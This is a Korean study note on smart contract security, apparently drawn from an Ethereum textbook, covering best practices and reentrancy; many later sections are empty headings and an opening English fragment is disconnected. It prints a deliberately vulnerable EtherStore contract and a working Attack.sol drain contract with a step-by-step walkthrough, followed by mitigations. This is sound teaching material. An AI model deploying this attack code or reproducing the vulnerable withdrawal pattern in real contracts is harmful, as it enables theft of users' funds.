Now let’s look at the FibonacciBalance contract. Storage slot[0] now corresponds to the fibonacciLibrary address, and slot[1] corresponds to calculatedFibNumber. It is in this incorrect mapping that the vulnerability occurs. delegatecall preserves contract context. This means that code that is executed via delegatecall will act on the state (i.e., storage) of the calling contract.

# Smart Contract Security
스마트컨트랙트 프로그래밍에서 실수를 돌이킬 수 없는 결과를 만듦  
본 챕터에서는 보안 최고 예제와 디자인 패턴, 보안 대응 패턴을 알아 볼 것임  

프로그래밍은 개발자가 의도하지는 않았지만, 코딩한대로 작동한다  
또한, 모든 스마트컨트랙트는 퍼블릭이므로 누구나 트랜잭션을 통해서 상호 작동시킬 수 있음  
따라서, 코드가 가진 취약점을 극대화해서 공격 받을 수 있으므로 베스트 예제나 사전에 테스테된 라이브러리를 사용하는 게 좋음  

# Security Best Practices
반어적 프로그래밍이 스마트컨트랙트에서 가장 잘 맞는 프로그래밍 스타일임   
최고 실례는 다음과 같음  
### Minimalism/simplicity
복작성은 보안의 적임  
코드가 간결할 수록 버그를 더 줄일 수 있음  
스마트컨트랙트아 수천 라인 이상인 것은 보안에 문제가 있을 것으로 의심할 수 있음  
### Code reuse
바퀴를 다시 발명하지 마라  
라이브러리나 컨트랙트가 이미 존재한다면, 그것을 재사용하라  
보안 리스크는 업그레이드 보다 더 중요한 이슈임  
### Code quality
스마트컨트랙트 코드는 자비가 없음  
작은 버그가 금전적인 로스를 야기할 수 있음  
스마트컨트랙트 프로그래밍을 범용 목적의 프로그래밍처럼 여기지 마라  
우주비행체 프로그래밍을 하는 것처럼 스마트 컨트랙트 프로그래밍을 주의해서 하라  
일단 배포하면 되돌릴 수 없다  
### Readability/autitability
코드가 분명하고 이해하기 쉽게 짜야 한다  
읽기 쉬워야 감정하기도 쉽다  
이더리움 커뮤니티의 코딩 규칙을 따라서 작성해라  
### Test coverage
가능한 모든 영역을 테스팅하라  
모든 인자를 예상된 범위에서 충분히 테스트하라  

# Security Risks and Antipatterns
스마트 컨트랙트 프로글래머로서 대부분의 공통 보안 리스크와 친숙해야함  
이번 섹션에서는 보안 리스크와 어떻게 취약점이 생기고 대응 할 수 있는지 알아본다  
# Reentrancy
이더리움 스마트컨트랙트의 특징중 하나는 외부 컨트랙트의 코드를 호출하거나 이용하는 것임  
컨트랙트는 또한 이더를 핸들링하고 외부 사용자 주소로 이더를 보낼 수 있음  
이런 작업은 컨트랙트가 외부 호출을 할 수 있는 함수 목록을 제출하고 요구한다  
이런 외부 호출 부분을 해커가 폴백 함수를 통해서 추가적인 코드를 실행하고 컨트랙트를 강제한다  
이런 종류의 공격이 악명높은 DAO hack 에서 사용되었음  
## The Vulnerability
이런 공격 형태는 컨트랙트가 알수없는 주소로 이더를 보낼 때 나타날 수 있음  
해커가 폴백 함수내에 악의적인 코드를 넣어서 외부 주소의 컨트랙트를 만들 수 있음  
따라서 컨트랙트가 이 주소에 이더를 보낼때 악의적인 코드가 실행될 수 있도록 할 수 있음  
전형적으로 악의적인 코드는 취약한 컨트랙트의 함수를 실행하는데,  
원 개발자가 예상하지 못했던 작업을 수행함  
"reentrancy" 용어는 악의적인 외부 컨트랙트가 취약한 컨트랙트 함수를 호출한다는 사실로부터 만들어졌음  

아래 샘플코드 EtherStore.sol 은 매주 1 이더를 인출할 수 있게 예금자에게 허락함  
```
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
```
위 컨트랙트는 2개의 public 함수가 있음. depositFunds, withdrawFund  
depositFunds 는 보낸자의 잔액을 증가시키고  
withdrawFunds 는 보낸자가 인출할 수 있는 wei 의 양을 구체화함  
이 함수는 인출를 위해서 요청된 양이 1 이더보다 작거나  
인출이 지난 주에 없었을때에만 이루어짐  

위 코드의 취약점을 이용해서 공격자가 아래의 컨트랙트를 만들없음 Attack.sol  
```
import "EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
```
공격이 어떻게 이루어지나?  
첫째, 공격자가 악의적인 컨트랙트를 만든다(예 0x0...123)  
위 컨트랙트는 생성자에 인자로 EtherStore 컨트랙트의 주소를 넣어준다  
이것이 공격 대상인 컨트랙트를 etherStore 로 초기화시킨다  

따라서 공격자는 이제 attackEtherStore 함수를 호출할 수 있음  
위 예제에서 몇몇의 사용자가 이더를 이미 예금했다고 가정한다(약 10 이더)  
1. Attack.sol 의 라인 15:  EtherStore 컨트랙트의 depositFunds 함수가 1 이더의 msg.value 로 호출된다. 따라서 보낸자는 악의적인 컨트랙트의(0x0...123) 이고 잔액은 1 이더임  
2. Attack.sol 라인 17 : 악의적인 컨트랙트가 1 이더의 인자로 EtherStore 컨트랙트의 withdrawFunds 함수를 호출한다. 이것은 모든 요구사항을 통과할 것임(EtherStore 컨트랙트의 라인 12-16)  
3. EtherStore.sol 라인 17 : 컨트랙트는 악의적인 컨트랙트에게 1 이더를 돌려 줄 것임  
4. Attack.sol 라인 25 : 이때 악의적인 컨트랙트의 지불 절차가 폴백 함수를 실행할 것임  
5. Attack.sol 라인 26 : EtherStore 컨트랙트의 전체 잔액이 10 이더이고 현재는 9 이더이므로 진술문을 통과할 것임  
6. Attack.sol 라인 27 : 폴백 함수가 EtherStore 의 withdrawFunds 함수를 다시 호출하고 EtherStore 컨트랙트에 재진입한다  
7. EtherStore.sol 라인 11 : withdrawFunds 의 2번째 호출에서 공격하는 컨트랙트의 잔액은 여전히 1 이더 임. 라인 18이 아직 실행되지 않았으므로. 따라서 balances[0x0...123] = 1 ether 임. 이것은 또한 lastWithdrawTime 변수의 경우이다. 다시 모든 요구사항을 통과한다.  
8. EtherStore.sol 라인 17 : 공격하는 컨트랙트가 또하나의 1 이더를 인출함  
9. 단계 4-8 반복함, EtherStore.balance > 1 더 이상 안 맞을 때까지  
10. Attack.sol 라인 26 : 일단 EtherStore 컨트랙트에 1 이더 보다 적게 남는다면 if 조건문을 실패할 것이다. 이것은 EtherStore 컨트랙트의 라인 18, 19 번을 실행하게 한다.  
11. EtherStore.sol 라인 18, 19 : balances 와 lastWithdrawTime 매핑은 값이 설정되고 실행은 종료할 것임  

## Preventative Techniques
잠재적인 재진입 취약점을 회피하기 위한 몇가지 공통 기술이 있음  
첫째는 이더를 외부주소로 보낼때는 가능한 내부 함수인 transfer 를 사용하라   
transfer 함수는 외부 호출에 오직 2300 gas를 사용하므로 목적지 주소나 컨트랙트가 또다른 컨트랙트를 호춯하기에는 가스가 충분하지 않다  

두번째 기술은 상태 변수를 바꾸는 모든 로직은 이더가 컨트랙트 외부로 보내지기 전에 이루어지게 한다  
EtherStore 예제 라인 18, 19는 라인 17 전에서 놓여야 한다  
이것이 좋은 실예이다. 
외부 호출을 알수없는 주소로 수행하는 어떤 코드도 로컬 함수나 코드 실행의 마지막 부분에 행해야한다  

세번재 기술은 뮤텍스이다. 즉, 코드 실행동안에서 상태 변수를 막는 기능을 넣는다  
아래 예제는 재진입 호출에 자유로는 컨트랙트임  
```
contract EtherStore {

    // initialize the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }
 }
 ```
 
 ## Real-World Example: The DAO  
 DAO(분산화된 자율 조직) 공격은 이더리움의 초기 개발단계에서 나타난 주요 공격중에 하나임  
 그 당시 컨트랙트는 150만 달러를 가지고 있었고, 재진입 공격 발생했다  
 그 결과로 하드포크가 일어나 이더리움 클래식으로 분화됨  
 
# Arithmetic Over/Underflows


# Entropy Illusion

## The Vulnerability

## Preventative Techniques

## Real-World Example: PRNG Contracts

# External Contract Referencing

## The Vulnerability

## Preventative Techniques

## Real-World Example: Reentrancy Honey Pot

# Short Address/Parameter Attack

## The Vulnerability

## Preventative Techniques

# Unchecked CALL Return Values

## The Vulnerability

## Preventative Techniques

## Real-World Example: Etherpot and King of the Ether

# Race Conditions/Front Running

## The Vulnerability

## Preventative Techniques

## Real-World Examples: ERC20 and Bancor

# Denial of Service (DoS)

## The Vulnerability
### Looping through externally manipulated mappings or arrays
### Owner operations
### Progressing state based on external calls

## Preventative Techniques

## Real-World Examples: GovernMental

# Block Timestamp Manipulation

## The Vulnerability

## Preventative Techniques

## Real-World Example: GovernMental

# Constructors with Care

## The Vulnerability

## Preventative Techniques

## Real-World Example: Rubixi

# Uninitialized Storage Pointers

## The Vulnerability

## Preventative Techniques
## Real-World Examples: OpenAddressLottery and CryptoRoulette Honey Pots

# Floating Point and Precision
## The Vulnerability

## Preventative Techniques
## Real-World Example: Ethstick

# Tx.Origin Authentication
## The Vulnerability

## Preventative Techniques

# Contract Libraries
# Conclusion

